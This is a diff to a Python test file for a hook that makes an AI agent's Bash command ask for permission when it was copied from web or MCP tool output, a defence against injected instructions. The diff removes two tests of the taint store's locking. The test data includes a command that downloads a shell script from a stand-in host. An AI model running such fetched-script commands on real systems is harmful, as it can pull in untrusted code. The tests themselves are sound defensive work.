@@ -1,6 +1,5 @@
 """T-1053: a Bash command copied from text a web/MCP result returned asks before it runs."""
 import json
-import os
 
 from test_hooks import HookCase, parse
 
@@ -82,43 +81,6 @@ class ToolTaint(HookCase):
         self.hook("SessionStart", {"source": "compact", "session_id": "s1"})
         out = self.bash("curl -O https://x.example/i.sh").get("hookSpecificOutput", {})
         self.assertEqual(out.get("permissionDecision"), "ask", out)
-
-    CMD = "curl -O https://x.example/i.sh"
-
-    def store(self, data):
-        from sampo import hooks
-        path = hooks._taint_path("s1")
-        os.makedirs(os.path.dirname(path), exist_ok=True)
-        with open(path, "w") as f:
-            f.write(data)
-        return path
-
-    def test_a_store_read_mid_write_still_asks(self):
-        # T-3577: the store is read once without the lock; a read that finds it cut short (a writer mid-write) falls
-        # through to the locked read, which decides
-        from unittest import mock
-        from sampo import hooks
-        path, whole, reads = self.store(json.dumps({"lines": [self.CMD]})), json.load, []
-        cut = json.dumps({"lines": [self.CMD]})[:-1]  # {"lines": ["…"] cut short
-
-        def load(f, *a, **k):
-            if getattr(f, "name", None) == path:
-                reads.append(f)
-                if len(reads) == 1:
-                    return json.loads(cut)  # the unlocked read finds it cut short: ValueError
-            return whole(f, *a, **k)
-        with mock.patch.object(hooks.json, "load", load):
-            got = hooks._taint_check({"session_id": "s1", "tool_input": {"command": self.CMD}}, self.project())
-        self.assertEqual((got[0], len(reads)), ("ask", 2), got)
-        with open(path) as f:
-            self.assertEqual(json.load(f)["asked"], [self.CMD])
-
-    def test_a_line_already_asked_passes_without_the_lock(self):
-        path = self.store(json.dumps({"lines": [self.CMD], "asked": [self.CMD]}))
-        before = os.stat(path)
-        self.assertNotEqual(self.bash(self.CMD).get("hookSpecificOutput", {}).get("permissionDecision"), "ask")
-        self.assertFalse(os.path.exists(path[:-5] + ".lock"), "no lock taken, no store rewritten")
-        self.assertEqual(os.stat(path).st_mtime_ns, before.st_mtime_ns)
 
     def test_other_commands_and_sessions_pass(self):
         self.fetch()
